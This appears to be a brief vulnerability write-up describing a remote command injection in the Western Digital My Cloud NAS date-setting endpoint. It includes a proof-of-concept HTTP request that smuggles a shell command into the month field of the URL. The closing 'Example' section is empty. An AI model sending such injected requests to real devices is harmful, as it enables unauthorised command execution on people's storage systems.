## Western Digital My Cloud NAS

### Description

The  parameter **$month** in `setDataTime` function in the file `\usr\www\application\models\settingsregional.php`  has a Remote Command Injection vulnerablilty .

`\usr\www\application\models\settingsregional.php`

### POC

```
POST /settings/setDateTime/2000/12$(id>poc_month.txt)/12/12/12 HTTP/1.1
Host: XXXXXXX
```

### Example 